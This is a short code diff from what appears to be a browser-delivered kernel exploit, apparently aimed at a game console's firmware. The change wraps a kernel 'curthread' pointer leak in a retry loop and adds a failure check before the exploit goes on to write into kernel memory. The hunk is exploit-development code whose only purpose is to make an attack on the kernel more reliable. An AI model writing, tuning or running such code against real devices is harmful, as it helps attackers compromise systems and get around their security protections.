@@ -1148,8 +1148,27 @@ let allDone = false,
       if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
       return new int64(hitLo >>> 0, hitHi >>> 0);
     }
-    const CT1 = await leakCurthread(w1);
+    // Curthread leak can be timing-sensitive. Retry the same worker a limited
+    // number of times before giving up, and never dereference a null CT1.
+    const LEAK_RETRIES = params.get("leakretry")
+      ? Math.max(1, Math.min(3, parseInt(params.get("leakretry"), 10) || 1))
+      : 2;
+    let CT1 = null;
+    for (let leakAttempt = 1; leakAttempt <= LEAK_RETRIES && !CT1; leakAttempt++) {
+      if (leakAttempt > 1)
+        mark("PR-LEAK-RETRY", "attempt=" + leakAttempt + "/" + LEAK_RETRIES);
+      CT1 = await leakCurthread(w1);
+    }
     armTrace = true;
+    if (!CT1) {
+      check(
+        "curthread-leak",
+        false,
+        "no valid kernel curthread pointer after " + LEAK_RETRIES + " attempt(s)"
+      );
+      state("curthread leak failed — retry or verify firmware timing", "bad");
+      return;
+    }
 
     if (REAPLEAK) {
       put(lkNdv, 0x00, LX);
